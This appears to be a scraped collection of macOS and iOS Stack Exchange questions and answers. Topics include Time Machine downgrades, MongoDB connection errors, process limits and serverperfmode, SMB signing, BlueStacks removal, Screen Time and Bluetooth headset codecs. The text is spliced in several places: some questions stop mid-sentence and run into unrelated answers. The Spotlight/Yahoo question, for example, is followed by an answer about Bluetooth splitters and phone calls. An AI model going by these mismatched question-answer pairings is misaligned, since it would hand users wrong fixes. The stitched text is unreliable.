backup, so I do not have a backup made shortly before I upgraded, which I could otherwise easily use. \n\nA: I did the same thing by using a USB installer and migrated data from the Time Machine backup during the install (it's one of the choices during the install). In my experience the data (minus the OS) should come back to Mojave but it may not be visible in the list of backups to choose from when choosing a backup source during the install. To explain further:\nWhen I installed Catalina I chose to migrate data from the Time Machine backup of Mojave which was successful. In the brief period of time I had Catalina it made maybe 1 or 2 Time Machine backups. When I chose to erase the SSD, and install Mojave again, Catalina appeared to have changed the file extension of the backup from .sparsebundle to .backupbundle . This stopped Time Machine on Mojave from being able to show me the backup to select (imagine my heart rate). So, erased again, installed Catalina, and after browsing the Time Machine backup in Finder, I could see the old backup there, changed the file extension from .backupbundle to .sparsebundle , erased the SSD again, installed Mojave and presto, the previous Mojave backup was visble again. The data migrated successfully for the most part (except my Contacts which is a whole other story).\n\nA: You can try to use the Migration Assistant app from within macOS (which you can find in the Utilities folder) and choose only specific files to restore, like your user folder etc. \nThis may depends on if the Catalina backup is readable by Mojave as they have different backup formats: Mojeve (.sparsebundle and Catalina .backupbundle).\nSee: https://support.apple.com/el-gr/HT204350. \n", "Q: Connection refused: MongoDB 4.2 on Mac OS I am trying to set up a MongoDB 4.2.X Community instance on my local computer. \nHowever, I am getting the following error message:\nError: couldn't connect to server 127.0.0.1:27017, connection attempt failed: \n    SocketException: Error connecting to 127.0.0.1:27017 :: caused by ::\n    Connection refused : connect@src/mongo/shell/mongo.js:341:17\n\nI have followed all instructions on https://docs.mongodb.com/manual/tutorial/install-mongodb-on-os-x/ and couldn't find any suitable help on the internet. \nDoes anybody know how to fix this?\n==> Summary\n  /usr/local/Cellar/mongodb-community/4.2.0: 21 files, 272.3MB, built in 5 seconds\n\nJuliens-iMac:~ julien$ mongod --config /usr/local/etc/mongod.conf\n\nJuliens-iMac:~ julien$ mongo\nMongoDB shell version v4.2.0\nconnecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb\n2019-10-19T11:47:04.088+0200 E  QUERY    [js] Error: couldn't connect to server 127.0.0.1:27017, connection attempt failed: SocketException: Error connecting to 127.0.0.1:27017 :: caused by :: Connection refused :\nconnect@src/mongo/shell/mongo.js:341:17\n@(connect):2:6\n2019-10-19T11:47:04.090+0200 F  -        [main] exception: connect failed\n2019-10-19T11:47:04.091+0200 E  -        [main] exiting with code 1\n\nJuliens-iMac:~ julien$ brew services list\nName              Status  User   Plist\ndocker-machine    started julien /Users/julien/Library/LaunchAgents/homebrew.mxcl.docker-machine.plist\nmongodb-community started julien /Users/julien/Library/LaunchAgents/homebrew.mxcl.mongodb-community.plist\n\n\nA: I faced same problem on my mac catalina.\nSo I followed instructions you mentioned, and then removed everything manually from /usr/local/var/mongodb\nAfter restarting the mongodb-community service I could successfully connect to it.\n\nA: if you have MAC, you can run:\nbrew services start mongodb-community@4.4\n\n", "Q: Unable to edit .bash_profile file on mac Unable to edit ~/.bash_profile file on my mac.

Given this, if I should move what I wrote to be a comment under the OP's question, then please let me know, or feel free to go ahead and do so.\nI managed to get things working again by removing the Thunderbolt bridge and Thunderbolt ethernet slot(s) from the Network settings. I then installed the support driver (found here: https://archive.caldigit.com/KB/index.asp?KBID=179&viewlocale=1 ) It says that it's the Ethernet driver, but the part that I needed was the Support driver; in fact, the Ethernet driver install failed several times for reasons that are unclear to me. Once I got the USB Hub Support file installed, and I rebooted, the network preferences gave the option of a Thunderbolt Ethernet Slot, which I installed and it seems to work.\nI recall that there was a Thunderbolt bridge before, but it doesn't seem to be needed now, so I wonder if something that was added/changed with the last OS update is the culprit.

If I a restore from a TimeMachine backup, won’t it also restore the Catalina version of macOS on the new MacBook Air?\n\nA: This has already been answered here\nAnyway you should be fine as long as you only import data, e.g. desktop, documents, downloads, etc.  I would not try to carry over ~/Library folder, as this may contain items that are only relevant to the 'newer' version of macOS.  You should probably separately export Apple Mail and re-import as well.\nThat being said... why don't you just first update the 2019 to 10.15 then directly import your time machine and not worry about incompatibilities?\n\nA: To migrate to another MacOS version you only need to copy over your home folder and /Applications (excluding the pre-installed MacOS apps).\nYou can use any backup tool such as Time Machine or rsync (here is an example).\nFor Time Machine, go to Settings > Time Machine > Options and add the folders to exclude from the backup. \nYou can click the + button or drag the folders from Finder into the excluded list. To avoid backing up the operating system drag /System, /Library, /opt and /usr.\nIf you use homebrew it's probably better to configure it from scratch on a new machine. It might be useful to generate a list of current brew packages with brew list and brew cask list. Then you can reinstall all your brew packages with brew install < mypackages.txt and brew cask install < mycaskpackages.txt accordingly.\n", "Q: Why is Spotlight contacting Yahoo i.e. Oath?

For example in earlier days you had headphone-jack splitters, then Bluetooth splitters - and now Apple has their own built-in support for multiple listeners.\nHowever that is all it is - multiple listeners. Even with one of the external Bluetooth splitters available for the iPhone, you can only listen to audio - it doesn't work with the microphone.\nIn order to achieve the effect you want, you'll need to have two cellphones, and have your provider set it up so that both ring when a call comes in. This can be done via traditional cell phone technology, or it can be a Voice over IP solution - in that case you could also use an iPod Touch, iPad or other device.\n", "Q: Fix \"fork: resource temporarily unavailable\" on OS X / macOS I ran into some problems on my Mac running OS X El Capitan 10.11.6 that appeared to be related to resource limits.

I was hitting the systemwide limit kern.maxprocperuid.\nI was able to confirm this by running a shell as root:\n$ id -ru\n501\n$ sudo -i\nroot# ps -xu 501 | wc -l\n706\n\nYes, 706 < 709, but mdworker processes routinely come and go, so being close to to the limit was evidence enough.\nHow do I increase the limit on the number of processes I can run? I searched around for answers and found articles that suggested I create a file /Library/LaunchDaemons/limit.maxproc.plist with this content:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?> \n<!DOCTYPE plist PUBLIC \"-//Apple/DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> \n <plist version=\"1.0\">\n <dict>\n <key>Label</key>\n <string>limit.maxproc</string>\n <key>ProgramArguments</key>\n <array>\n  <string>launchctl</string>\n  <string>limit</string>\n  <string>maxproc</string>\n  <string>2048</string>\n  <string>4096</string>\n </array>\n <key>RunAtLoad</key>\n <true />\n <key>ServiceIPC</key>\n <false />\n </dict>\n</plist>\n\nI did that and rebooted and now\n$ ulimit -u\n2048\n\nWhich would be great, except\n$ sysctl kern.maxproc\nkern.maxproc:\n1064\n\nTHIS IS DANGEROUS. What it means is that the entire system is still limited to a maximum of 1064 processes, but an individual user is allowed to create more than that. When the system hits the maximum number of processes, it generally crashes quickly and in a very bad way. It is therefore very important that no user be allowed to create enough processes to fill up the process table, which is why on the Mac users are limited to 2/3 of the total number of processes. \nI found similar suggestions regarding the maximum number of open files maxfiles and maxfilesperproc, which are even more dangerous, because a single process should get nowhere near being allowed to open the systemwide limit on the total number of open files. \nThe other issue is that if 709 processes was not enough, 1000 processes is really unlikely to be enough either. \nSo, what is the right way to fix \"Too many open files\" or \"fork: resource temporarily unavailable\" on OS X El Capitan?\n\nA: If your computer is routinely bumping up against process limits and it is not due to some runaway program or malware, then instead of trying to override the defaults, you should switch to a different set of defaults known as \"Performance Mode\" (a.k.a. \"Server Performance Mode\" or perfmode or serverperfmode).\nTo do this on El Capitan (and later macOS versions until further notice), you do not need to create new files or mess with turning SIP on or off, all you need to do is \n$ sudo nvram boot-args=\"serverperfmode=1 $(nvram boot-args 2>/dev/null | cut -f 2-)\"\n\nThis is officially supported by Apple, and changes the default configuration of your computer from an interactive computer you are going to use for email and web browsing to a server you are going to use to run a lot of non-interactive software. \nThe new limits depend on how much memory you have and require you have at least 16 GiB of memory installed, but at a minimum, you will see your user limit on the number of processes you can run increase from 709 to 3,750 and many other limits are increased. Most importantly, systemwide limits will also increase so that a single rogue user or program will not be able to crash the system through resource exhaustion. \nThis is a much better way to increase your system limits because it increases all the interrelated limits in a consistent way, taking into account the capabilities of your specific computer. It's also much easier to do. The only downside is that if you ever reset your NVRAM, you will need to run the nvram command again to turn performance mode back on. But that is also a plus, because if the new settings really get you into trouble, all you need to do to undo them is reset your NVRAM, which is a normal step in recovering when things go really bad. If you instead created the LauchDaemons plist files some people suggest, you would have to remember about them to remember to edit or delete them to get back to a standard configuration. \n", "Q: Is there any way I can update macOS to Catalina after I used ignore command in terminal I used this command\nsudo softwareupdate --ignore \"macOS Catalina\"\n\nNow, it is not showing any update, nor downloading from app store.

In macOS, the system is limited to running no more than 1064 processes (or 2088 starting with Catalina) systemwide, and individual users are limited to 709 (or 1392 in Catalina). Why is there a limit? Why is it this size? Why not a round number like 2500 or a binary round number like 1024?\nUpdate: The limit actually varies in size depending on the version of OS X/macOS and the amount of memory installed in the computer. 1064 was a common limit prior to Catalina and then 2088 became common, but these are not the only limit values a Mac might have.\n\nA: As far as I can tell, the answer is part of the long history of computing.\nmacOS is based on Darwin, which is the core of Apple's operating system, and which itself is based on xnu, which is a hybrid of FreeBSD layered over Mach, which are based on... until you go back really far to, I don't know, Ada Lovelace? Believe it or not, that is an oversimplification of the macOS history, but it covers the points needed to understand what follows.\nIn the days when FreeBSD was being developed, memory was expensive, so there was strong incentive to use as little as possible, but not so expensive that you could not build a system shared by a University department. The idea was to have 1 computer that could be used by many people at once, and even if the memory was expensive, the users were only consuming was some memory and disk space, rather than a whole computer, so you wanted to be able to serve as many people as you could without compromising the whole system.\nThe kernel has a section of memory reserved to hold information for each process, and the size of that table was what limited the total number of processes the system could run at once, so you wanted to keep that table as small as possible, but at the same time big enough to run enough processes to serve all your users. Other kernel memory reservations, such as the number of buffers allocated to store network traffic temporarily, also needed to scale with the number of concurrent users, so FreeBSD introduced a tuning parameter called MAXUSERS, which was not a real limit on how many users the system would handle, but rather a tuning parameter that you set to indicate the maximum number of users you intended to handle at one time. It adjusted the balance between memory allocated to the kernel and memory available to the users.\nPrior to graphical user interfaces, individual users on a Unix system typically ran very few processes. They ran a terminal shell, which maybe ran an editor, an email program, a compiler, and some other program, each of which was one process. The email program and compiler would run some other processes. At some point someone estimated that a user would likely need to run no more than 16 processes at once.\nSomeone (probably the same person) estimated that the system itself could be safely limited to about 20 processes.\nThis provided the basis for scaling the size of the process table based on the number of concurrent users the system would support:\n#define NPROC (20 + 16 * MAXUSERS)\n\nAt the time Apple incorporated xnu into their system (and presumably at the time xnu forked from FreeBSD) MAXUSERS defaulted to 32. With 32 users, NPROC was 532. And so it was in OS X 10.0. 532 was the systemwide limit on the total number of processes. Individual users were limited to half that: 266.\nAnd so it remained, until OS X 10.7 Lion, at which point Apple added a scale factor. (Actually, it had has a scale factor long before Lion for Server Performance Mode, but with Lion they extended it a bit to normal mode.) If your computer is running Lion or later and has 3 GiB or more of memory, then maxproc is doubled, and maxprocperuid, which is a fraction of maxproc, goes up even more. maxproc goes from 532 to 1064 and maxprocperuid goes from 266 (maxproc / 2) to 709 ((maxproc * 2) / 3).\nAnd so you get your 2010's (10.7 Lion through 10.14 Mojave) limits of 709 processes per user and 1064 processes systemwide.\nIn 10.10 Yosemite, NPROC changed from (20 + 16 * MAXUSERS) to (20 + 16 * 32) presumably so they could get rid of MAXUSERS while keeping NPROC unchanged. In 10.15 Catlina, NPROC was raised for the first time, but oddly they kept the \"20 +\" and made it (20 + 32 * 32) So starting with Catalina maxproc is a multiple of 1044.\nWhy a multiple, you ask? Starting with 10.13 High Sierra, maxproc continues to scale up as you add more memory. It doubles if you have 3 GiB but less than 12 GiB of memory, and above that it multiplies by memory size divided by 4 GiB until you hit a limit a the scale factor of 16 when you have 64 GiB or more memory installed.\nNow you know why maxproc is a multiple of 532 or 1044 rather than the more common 512 or 500.\nIf you want to increase your limits further, you have to switch to server mode. You can read more about how to do that and why at Fix “fork: resource temporarily unavailable” on OS X. You can read a lot of details about what server mode really gives you at What does serverperfmode=1 actually do on macOS?\n", "Q: Cannot connect to SAMBA shares drive after update to Catalina I have a raspberry pi 4b running raspbian buster lite, connected to this I have a 1TB HDD, on Mojave I was able to connect to the network folder and access the files on it, however with the new Catalina update I get this when I try to access it (I can still see it) \"The operation can’t be completed because the original item for “RASPBERRY FOLDER” can’t be found.\"\nIs there any way to fix this or connect to the folder/files a different way?\n\nA: Turn off packet signing for SMB 2 and SMB 3 connections as described in\nhttps://support.apple.com/en-gb/HT205926:\n\n\n*\n\n*Edit /etc/nsmb.conf (create it if necessary)\n\n*Add\n[default]\nsigning_required=no\n\n\n*Save file\n\n*Reconnect SMB shares (or reboot your Mac)\n\n\nA: This insight gave me the ANSWER to fix my concerns...\ntrying the different connection prefixes one gave me the answer - cifs:\\\nIT works for the MOMENT\nnot sure why it versus Western Digital default answer of smb:\\ or afp:\\ or other concoctions of prefixes would change permissions to files...IT WORKS (more inquisitive research may be involved - why fix a broken command) !\n\nA: I had the same problem and solved it in a strange way, \nAs we are all aware Mac user has actually 2 names: one is the username (the profile name if i may) and the Display name.\nPrior to Catalina , when authenticating with an SMB share from a Windows computer , I was using the display name (although it is a full name with a space) and everything was cool.\nIn Catalina , I found out I can only use the username, windows cannot authenticate with the display name.\nof course , before I got to this point I have checked/enabled SMBv2, created the NetBios file in the MAC and all the other hints I could find, which obviously did not do the trick for me.\nhope this helps\n", "Q: Cant delete persistent damaged application Bluestack I uninstalled BlueStacks as it was unused application, and it persists as a broken application and I can't delete it.\nI've tried to sudo rm -rf but it said operation not permitted.\n\n\n\n\nIs there any way i can delete it cleanly?\n\nA: You'll need to boot the Mac in Recovery Mode (hold Cmd + R when rebooting), open a Terminal and run the command below. This will allow you to remove the rest of the app.\nrm -rf /Volumes/Macintosh\\ HD/Library/StagedExtensions/Applications/BlueStacks.app\n\nThe reason is that when you install Bluestacks, you install not only the app itself, but also a kernel extension that is stored in /Library/StagedExtensions. You give specific permission to install that extension.\nHowever, when it comes to uninstalling - as Bluestacks doesn't provider a full uninstaller - you'll have to do it manually. Unfortunately SIP protects the kernel extensions from alteration when booted in standard mode. By rebooting in Recovery Mode (or disabling SIP), you can delete the files.\nIf you need, you can follow a more thorough how-to on how to reboot in Recovery Mode and remove the kernel extension here:\nhttps://eclecticlight.co/2018/01/02/the-app-you-cant-trash-how-sip-is-broken-in-high-sierra/\n\nA: You may be able to clear the files, without the reboot, using:\nsudo kextcache --clear-staging\n\nSource: this SO Q.

If it could, another option would be to clone the older MacBook Pro to the newer one and then slowly update through all version of macOS, all the way to Catalina.\n\nA: I ended up not migrating the whole machine. Since Catalina supports only 64-bit apps, it makes more sense to re-install one by one. Since most of my files (data) are synced online, no need to move them over either: I can find them back using a cloud storage solution (iCloud, Dropbox, OneDrive or pCloud).\nThe most important thing I needed to migrate over though that was not synced online was my mail archive: multiple mailboxes sitting on the machine itself (i.e. not on any active account such as Exchange or Gmail). The solution for this turned out to be simple: \n1) El Capitan was cloned on an external harddrive\n2) External HD was connected to the new machine running Catalina\n3) On Catalina, within the Mail App > Import Mailboxes... > choose “Apple Mail” continue > navigate to the external HD and find user/library/mail\n4) Import\nTo improve management of archived email, I’d recommend using a third-party software such as MailSteward or EagleFiler.\n", "Q: How to make Tab move the cursor between only input fields ignoring everything else?

This is the image of my terminal in Spyder:\n\n\nA: The problems observed are related to the new system policy for user owned \"system folders\" like Documents, Desktop etc.\nHere is a related syslog entry me trying to execute or open some script/file in $USER/Documents/ with Spyder/iPython:\nSandbox: python(2233) System Policy: deny(1) file-read-data /Users/admin/Documents\nViolation:       System Policy: deny(1) file-read-data /Users/admin/Documents \nProcess:         python [2233]\nPath:            /Users/admin/opt/anaconda3/python.app/Contents/MacOS/python\nLoad Address:    0x103cbc000\nIdentifier:      com.continuum.python\nVersion:         ???

The permission errors should disappear afterwards.\n", "Q: Are these unix exe files and others 32-bit code, & should I do something about them before moving to Catalina? I am running Mojave 10.14.6  (on a late 2013 MacBook Pro), waiting to upgrade to Catalina.  Checking for 32bit applications lead to a list containing\n/System/Library/Frameworks/DiscRecording.framework/Versions/A/Resources/draudiotool\n/System/Library/Frameworks/AppKitScripting.framework/Versions/A/AppKitScripting\n/System/Library/PrivateFrameworks/vmutils.framework/Versions/A/vmutils\n/System/Library/PrivateFrameworks/CoreMediaPrivate.framework/Versions/A/CoreMediaPrivate\n\n(which seem to be mostly Unix executable files), some dynamic libraries, a few apps, and then some items like this\n/sbin/autodiskmount\n/usr/sbin/pictd\n/usr/lib/libnetsnmp.5.2.1.dylib\n/usr/bin/qc2movie\n\nAre these 32-bit code files that are going to block the use of apps, even if the apps are 64-bit?  Will installing Catalina remove them, or should I delete them first?  I can delete the apps (don’t need or can upgrade them), but is there anything I can do ahead of time with this list?\n\nA: The content of /System as well as all files in /sbin, /usr/sbin, /usr/lib and /usr/bin is part of a macOS installation and will be replaced/upgraded if/when you upgrade to Catalina.\n", "Q: Reboot directly from MacOS to Startup Manager? (Init command) I have a strange setup (briefly, I have Windows 10 on an external SSD and I use a MacBook Pro as my main Mac these days in a dock that connects to an external monitor which has a hub - Samsung CJ79 34\" - everything, including the SSD, is plugged into the monitor).\nBecause of this strange setup I can only change startup disks via the Startup Manager - I can't boot directly from the Startup Disk control panel.  However, my Windows keyboard doesn't work to change desktops I need to plug in my original Apple keyboard.\nKnowing that MacOS is basically a heavily modified UNIX setup I hazard to guess there is a command somewhere in the OS (like the init command) that will let me boot directly from MacOS to the Startup Manager screen.\nDoes anyone know what this is and if it is possible?  Thanks.\n\nA: A few days ago, I had a problem to reboot on the recovery-mode (CMD+R) and to also to have access to the startup manager (Option/Alt). None of those key combinaisons would work for me. So after some research, I found out how to boot in any drive without the startup manager.  \n\n(Solution 1) Reboot directly onto a USB drive or another partition without the startup manager:\nYou just need the macOS application Boot Manager. Once installed, it appears in the menu bar, just like the image below. You can  then select the drive that you want to reboot onto.\n\nHere is a tutorial on how to install it: Boot Manager installation tutorial\nNote: At some point, you will need to reboot into the recovery-mode. So you can use the following trick \n\n\n*\n\n*Open a terminal\n\n*Type in: \n\n\nsudo nvram recovery-boot-mode=unused\n\n\n*Enter the admin password\n\n*Restart the computer. It will automatically reboot into the recovery-mode\n\n\n\n(Solution 2) Replace the startup manager: You can replace the startup manager with an application (just like rEFIND) that will ask you to select the drive to boot onto without having to press the \"Option/Alt\" key when booting up your computer. The app is Next Loader and is from the same dev. The installation tutorial is here. \n\nA: If you install the free rEFInd boot manager, then you can issue a command to boot directly from MacOS to the rEFInd boot manager screen. However, the default behavior of rEFInd is to appear when the Mac boots. This makes it unnecessary to issue the command asked for in your question.\nrEFInd can also be configured to select the default operating system to boot directly from macOS. This can be accomplished using a GUI or CLI. \n", "Q: Safari: Shortcut to switch between developer window and safari In every other application (including Chrome I'm coming from - before the Catalina update) I was able to switch between windows with Cmd + ` (on a German keyboard that is Cmd + >).\nIs there a shortcut to switch between an undocked developer window and the safari browser window?\nI'm not talking about switching Tabs (I fixed that already :D).\nUpdate\nI just saw, that I can change FROM browser TO dev window with Cmd.+ ` but not back. (!!? :D)\n\nA: Switch one way: Cmd + `\nSwitch the other way: Cmd + Shift + `\n\n\n*\n\n*Replace ` with the necessary language specific equivalent.\n\n*Your solution was very close. Normally the key combination you mentioned loops through available windows. In this specific case you have to return to a previous window by adding Shift.\n", "Q: How to auto-lock MacBook when inactive (without enabling screensaver) It is super easy to automatically lock a MacBook after a few minutes of inactivity, but this requires enabling a screensaver.\nhttps://www.google.com/search?q=auto+lock+macbook\nHowever, this method is frustrating, because launching any screensaver appears to take the focus away from the currently active application.\nThis means if I'm running Chrome, for example, and the screensaver is triggered, I will have to type in my password, and then click anywhere on the screen before I can interact with the Chrome app. If I wanted to open a new tab (CMD+T), pressing these keys on the keyboard does nothing until after I've clicked to regain focus.\nSay I have a full-screen terminal window open. After logging back into in, the terminal will not accept any keyboard input until I click somewhere on the screen with the mouse.\nReally annoying.\nHow to get around this?\nAutomatically locking the computer WITHOUT spawning a screensaver seems like it would work, because locking the computer manually doesn't produce the issue. How to auto-lock without a screensaver?\n\nA: You could try doing this:\n\n\n*\n\n*Turn screensaver off → System Preferences > Desktop & Screen Saver (Screen Saver tab) > Start after: never (bottom left).\n\n*Make sure the mac will go to sleep automatically → System Preferences > Energy Saver → Turn display off after.... Both computer sleep and dispay sleep will lock it.\n\n\n\nFor the mac to auto lock you of course need System Preferences > Security & Privacy > General (1st tab) > Require password ____ after sleep or screen saver begins (checkbox) to be checked.\n\nI didn't do very extensive testing, but after putting the mac to sleep or just the display and then unlocking the mac, it seems to let me write in the Chrome textarea... just with a little delay, but like you said screensaver doesn't. I don't know if the delay could be due to some of my third party applications, because oddly enough I can start writing immediately and it takes in a few letters, but then stops and after like a second I can start writing again. So I'm thinking it could be an app stealing the focus for a second there...\nI use Unlox and I noticed that when it locks my mac even with the screensaver locking, I can start writing just like with sleep. Unlox can lock the computer with or without the screensaver. The main point of unlox is that you can walk away from your computer with your iphone in your pocket and it gets locked when you get far enough (adjustable) and unlocks when you get close enough (adjustable). \nI guess I could also add that before I used unlox, I used to use Alfred to lock my computer manually, which has the system commands to put displays to sleep: sleepdisplays, or to put the whole computer to sleep: sleep and also screensaver, or to just lock the scren: lock. I think you can use these commands with the free version of Alfred.\n", "Q: Xcode 11 jumps to every desktop in Mac Os Catalina I recently updated my macOS Catalina (10.15) and also updated my Xcode to version 11.1 and I'm having issue with the window. Suppose I switch from Desktop-1 to Desktop-2, the Xcode also automatically moves to the current(focused) desktop. \nP.S Only Xcode is showing such kind of behaviour. \n\nA: If you right click on the application icon on the dock, you can select Options > and change the \"Assign To\" from All Desktops to None.\n", "Q: Understanding Processor specifications I'm not sure what a CPU-specification like \"3 GHz Intel Core i5\" really means.\nDoes it mean that there are five cores with 3 GHz each? Or are there 3 GHz distributed between the five cores?\nWhat would be the equivalent, if it would have only one single core?\nI mean: One can not say, that it is equal a single core with fifteen GHz, I guess ...\n\nA: Side note, Intel's i3, i5, i7, and i9 naming schemes don't tell how many cores there are (they used to, I believe, but they weren't 3, 5, or 7). Cores are also almost always distributed in even numbers.\n\n3 GHz\n\nThis means the speed at which the processor runs at. GHz is Gigahertz, or billions of hertz. Hertz is basically the number of times per second something is run. A 60Hz monitor refreshes its screen 60 times per second. In the case of CPUs, GHz is in reference to the number of clock cycles, which can contain one or more instructions per cycle. This also means that comparing GHz is a bad idea, as with each new generation of CPUs, clock cycles are used more efficiently, and in different ways (between Intel and AMD and especially ARM-based processors)\n\nIntel Core i5\n\nThe CPU is made from Intel, it's part of the \"Core\" lineup, more specifically the i5 lineup. i[number] used to mean it had a certain number of cores, whether it had hyperthreading, and I think few other things. It no longer means that. An i5 can have 2 cores with hyperthreading or 6 cores without, and anywhere in between. Without more info, such as the model number (i5-2500, for example), not much else is known about the CPU. With the model number, you can look up various information about the CPU. This includes information such as the number of cores it has, which means how many individual threads can be run at once.\nEven comparing two CPUs with the same GHz, core count, and generation doesn't mean they're identical. There are different processors for mobile, desktop, high end desktop, etc. A 3.0GHz 4 core laptop CPU runs with significantly less power and heat (and thus has less computing power) than it's desktop counterpart\nTo answer your final question, no, you cannot multiply GHz by cores. If we assume two CPUs are identical in every aspect except for core count, say a 3.0GHz 4-core and a 3.0GHz 8-core, we can't say that the 8-core is twice as powerful. Let's say you have a factory, which produces blankets. Each blanket takes 3 hours to sew. With 4 workers, you can produce 4 blankets every 3 hours. With 8 workers, you can produce 8 blankets every 3 hours. However, even if you have 100 workers, you still can't produce a blanket in less than 3 hours, since that's the time it takes to produce a blanket. This holds true for CPUs. Depending on what you're doing, you may not get any benefit from multiple cores. Some tasks can be heavily multithreaded. In our example, this would mean each part of the blanket could be made different people, then stitched together at the end. Other tasks cannot, such as growing a crop. You can have 10,000 crop fields, but you won't be able to harvest any faster than if you only had 1 crop. \n", "Q: FN key seems stuck on MacBook Air. Can't use function keys as normal When I press the function keys they act like the fn key is pressed. For example f11 usually lowers the volume, but when fn is pressed at the same time it shows the keyboard - and that's what happening now whether fn is pressed or not. This results in that I can't for example lower my volume (f11), or play music (f8).\nI've tried:\n\n\n*\n\n*Restarting my computer\n\n*Changing \"Use F1, F2, etc as normal function keys\" (System preferences > Keyboard) on and off\n\n*Spamming the fn key trying to feel if something is physically stuck making it being pressed down\n\n*Booting in safe mode\n\n\nTL;DR\nExpected behaviour\nWhen pressing f11 the volume should step down\nActual behaviour\nThe desktop is shown (windows moves aside)\nMojave: 10.14.6\n\nA: By updating to Catalina the problem was fixed! Although I don't belive it was solved by the update itself but rather some sort of reset or reboot that occured while updating.\n", "Q: Quick Look Preview of html files not working after iOS 13 upgrade in iPad After updating to iOS X 13, I can no longer use Quick Look on HTML files available in mail – I just get a blank preview window or enable javascript window, and the issue persists through a reboot. But all other files types work fine.\nIs there a cache I can clear or something else I can try to get this working again?\n\nA: Apple has disabled JavaScript in Quick Look for security/privacy reasons (this was used to track users previewing local files by pinging remote servers). \nIf you have your own app, use a WKWebView if you need JavaScript execution. If you are sending HTML content with JavaScript via email, send a link to a remote server instead. With a link people know they are contacting a remote server.\n", "Q: Date, time, and GPS metadata tagging video for iOS On 2019/10/16 (last Wednesday), I went skydiving in Las Vegas which they recorded but the provided video was in 10 seperate clips and none had time or GPS metadata tagged.

\"PATH\\Skydive_OpenShot_ExifTool_Test.mov\"\n\nThen I added the metadata / tags to the MOV file using the following command:\n& \"PATH\\exiftool.exe\" `\n\"-QuickTime:CreationDate=2019:10:16

"Q: \"This email address is not valid for use as an Apple ID\" Apple belatedly decided they don't like something about my email address, but won't tell me what.\nI just bought a new Mac for work and my employer paid for it so I set up a new Apple ID with my work email address rather than use my own. It seems you can't buy anything from Apple without using an Apple ID. That all went fine as far as can tell, Mac arrived, I switched it on and all works as expected but is a bit insistent about requiring my Apple ID for various things. \nSo I need to verify my Apple ID; they send an email with a code number; I type in code number…\n\"This email address is not valid for use as an Apple ID\"\nNo explanation, and no instruction what to do about this. I'm stumped.\nAnywhere I try to access my Apple account I am told I can't get in until I've verified my ID, but can't because my email address is somehow not valid.\nI have checked that I don't have the work email address associated with my personal Apple ID, so that's not confusing anything.\n\nA: If you use work e-mail and you just got the new e-mail account from work, it probably uses a work domain.\nIt extracts the MX records from the email address and connect to mail server (over SMTP and also simulates sending a message) to make sure the mailbox really exist for that user/address. Some mail servers do not co-operate in the process or have a delay, in such cases, the result of this email verification tool may not be as accurate as expected.\nThis technic of E-mail validation through the sending of an E-mail interrupted before the end is a technic used by criminals to perform stealth E-mail verification. This is the reason most serious companies will block these interrupted SMTP handshake. This is a bad method to check an E-mail.\nOften with not recognized or newly registered domains Apple takes a few days and then it will magically accepts the e-mail.\nYou can see here https://verifalia.com/validate-email what a e-mail validator will check. And the results.\nIf it doesn't work after serveral days, you should contact Apple Support.\n", "Q: How can I get Screen Time to really limit Screen Time? What I’m finding is that ST (even on iOS 13.1.x) doesn't work very well.\nIn particular, I find that even with access supposedly blocked from 7pm to 9am on every day except Saturday (when I limit access to 1 minute, since 0 does not appear possible), access to the following apps does not appear to be properly blocked at times clearly outside of 7pm to 9am period:\n\n\n*\n\n*Messages\n\n*Netflix\n\n*YouTube\n\n\nThis makes no sense to me. Messages is the worst offender. I've tried specifying the apps individually under App Limits (and yes, blocking is checked) and the categories (Social Networking and Entertainment), but it makes no difference!\nI've tried disabling Screen Time and reenabling it, but that didn't help. I also reset all settings.\nHere are some screenshots:\n\n\n\n\nA: Go to “always allowed” (located in the screen time settings and uncheck any apps you do not want to be accessible during a screen time lock).\n\nA: If you want to immediately block the apps from 7pm to 9am, I'm afraid you can't. That's because the lowest time you can specify before an app is locked is 1 min. That means if it's 7:30 pm and you haven't used any of the locked apps, for example YouTube, then you need to open it and keep it open for 1 min. Then only will it really get locked. A workaround to that is to set Downtime from 7pm to 9am and select all apps in Always Allowed except the apps you want locked.

Ideally, I'd want to activate it when a certain app is running. While the condition is easy to set, I can't find any way to then assign a \"prevent sleeping\" action. \n\nA: The closest you can currently do is to automatically open the correct settings screen using Shortcuts. This can be achieved by creating an URL and opening it in Safari:\nprefs:root=DISPLAY&path=AUTOLOCK\n\nThis will open the settings accordingly in the right place.\n\nMore URL schemes can be found here: A Comprehensive Guide to All 120+ Settings URLs Supported by iOS and iPadOS 13.1.\n\nA: As a workaround, I'd use combination of Low-power mode and Auto-Lock after t time. \nIn Display and Brightness Settings, you can set auto-lock to 1-5 minutes or never. Now since this might drain battery, use low power mode when your \"condition is not met\". This locks the auto-lock timer to 30 seconds. \nLow power mode has its own cons, like some syncs disabled, reduced brightness etc. \n", "Q: Block youtube on safari in hosts file When I try to block websites on terminal (etc hosts..) it works.

So I have some bluetooth headphones (they are Sony; unfortunately, I can't find the information that would tell me the exact model) that have a microphone, so I can use them to record my voice. Fine and dandy.\nHowever, I'm having the issue that whenever they are actually recording my voice, they cause the audio quality to get worse and quieter. This happens with every software that takes input that I can think of. Voice chat systems, like Skype, Discord, and Google Hangout cause this. Recording myself on quicktime player or any other audio recording software causes this.\nIs this a setting? How can I fix this?\n\nA: TL;DR: Bluetooth is limited in bandwidth.\n\nTo be able to let both incoming (microphone) and outgoing (speakers) audio data, your headset can use multiple audio codecs.\nDepending on your usage, it automatically switch from a codec set to another. The output quality gets worse (which use less bandwith) to allow input data from you microphone to get to your computer.\nNow you might ask, what if we wouldn’t use 2 separate codecs but keep up with one ?\nYou would either have have a poor audio quality all the time (no matter if the microphone is used or not), or have a good quality with recurring audio interruptions because it would be impossible for the headset and the computer to exchange all the required data in time.\nSome headsets even support more than 2 codecs. In such case they can have a greater control of the input and output quality balance. They would ask to your computer/phone/... which codecs they do understand, and make the best choice (depending on if you use the microphone or not) to give you the best audio quality.\nFor a non-exhaustive list of codecs used by Bluetooth devices: Apt-X, SBC, AAC (also used in Apple M4A audio files), LDAC, ...\nOther audio codecs might include: AC3, Opus, MP3, FLAC, Ogg, ... but they are not used in Bluetooth.\n\nIs this a setting ? How can I fix this ?\n\nIf your headphone does not explicitly allows you to switch the codec in use — in most cases — you can’t. The headphone already uses what it thinks as the best setting. Some headphones allow that, but it is mostly « high-end » (understand « expensive ») headphones.\n\nIt’s like in plumbing: a 